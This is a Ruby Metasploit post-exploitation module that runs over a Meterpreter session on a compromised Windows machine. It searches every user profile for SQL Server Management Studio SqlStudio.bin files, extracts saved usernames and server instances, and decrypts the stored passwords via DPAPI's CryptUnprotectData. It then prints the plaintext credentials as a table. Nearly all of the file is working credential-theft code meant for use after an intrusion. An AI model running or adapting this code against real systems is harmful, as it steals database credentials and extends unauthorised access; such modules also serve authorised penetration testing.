##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/util/dot_net_deserialization/formatters'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather ssms Passwords',
        'Description' => %q{
          This module can decrypt the password of ssms,
          if the user chooses to remember the password.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://github.com/HyperSine/how-does-ssms-encrypt-password/blob/master/doc/how-does-ssms-encrypt-password.md']
        ],
        'Author' => [
          'Kali-Team <kali-team[at]qq.com>'
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
  end

  def decrypt_data_with_dpaip(data)
    data = Rex::Text.decode_base64(data)
    rg = session.railgun
    pid = session.sys.process.open.pid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)

    mem = process.memory.allocate(1024)
    process.memory.write(mem, data)

    p_arch = session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch']
    addr = [mem].pack(p_arch == ARCH_X86 ? 'V' : 'Q')
    len = [data.length].pack(p_arch == ARCH_X86 ? 'V' : 'Q')
    ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, p_arch == ARCH_X86 ? 8 : 16)
    len, addr = ret['pDataOut'].unpack(p_arch == ARCH_X86 ? 'V2' : 'Q2')
    return '' if len == 0

    decrypted = process.memory.read(addr, len).force_encoding('UTF-16LE').encode('UTF-8')
    return decrypted
  end

  def find_string(file, offset, length = 0)
    result_string = ''
    if length == 0
      while (file[offset] > "\x20" && file[offset] < "\x7f")
        result_string << file[offset]
        offset += 1
      end
      return result_string
    elsif offset && length != 0
      return file[offset, length].unpack1('S!*') # port
    else
      return nil
    end
  end

  def pass; end

  def enum_session_file(fpath)
    ssms_info = []
    account_paths = []
    print_status("Search session files on #{fpath}")
    if session.fs.file.exist?(fpath)
      account_paths = session.fs.file.search(fpath, 'SqlStudio.bin')
    end
    # enum session file
    account_paths.each do |item|
      file_name = item['path'] + session.fs.file.separator + item['name']
      file = read_file(file_name)
      if file.nil? || file.empty?
        next
      end

      print_good("Parsing configuration file: '#{file_name}', please wait.")
      offset = 7
      index = 0
      buffer = ''
      usernames = []
      hostnames = []
      passwords = []
      while index < file.length
        if (file[index] && file[index] > "\x20" && file[index] < "\x7f" && file[index] != "\x3d")
          buffer += file[index]
          case buffer
          when 'UserName'
            usernames << find_string(file, index + offset) || ''
          when 'Instance'
            hostnames << find_string(file, index + offset) || ''
          when 'Password'
            passwords << decrypt_data_with_dpaip(find_string(file, index + 8)) || ''
          else
            pass
          end
        else
          buffer = ''
        end
        index += 1
      end
      hostnames.each_with_index do |hostname, i|
        host = hostname.split(',')[0]
        port = hostname.split(',')[1] || 1433
        ssms_info << { server: host, port: port, username: usernames[i], password: passwords[i] }
      end
    end
    return ssms_info
  end

  def run
    results = []
    grab_user_profiles.each do |user_profiles|
      results += enum_session_file(user_profiles['AppData'] + session.fs.file.separator + 'Microsoft\\SQL Server Management Studio\\')
      results += enum_session_file(user_profiles['AppData'] + session.fs.file.separator + 'Microsoft\\Microsoft SQL Server\\')
    end
    columns = [
      'HostName',
      'Port',
      'UserName',
      'Password'
    ]
    tbl = Rex::Text::Table.new(
      'Header' => 'SSMS Password',
      'Columns' => columns
    )
    results.each do |item|
      tbl << item.values
    end
    print_line(tbl.to_s)
  end
end
